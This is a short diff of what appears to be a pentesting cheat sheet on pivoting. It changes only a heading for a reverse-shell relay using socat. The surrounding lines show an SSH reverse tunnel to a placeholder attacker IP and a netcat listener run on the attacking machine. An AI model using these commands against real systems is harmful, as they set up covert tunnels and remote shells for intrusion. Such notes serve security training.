@@ -50,7 +50,7 @@ OR
 
 ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
 ```
-- #### Reverse Shell Relay using Socat
+#### Reverse Shell Relay using Socat
 ```powershell
 sudo nc -lvnp 443    # On Attacking Machine
 
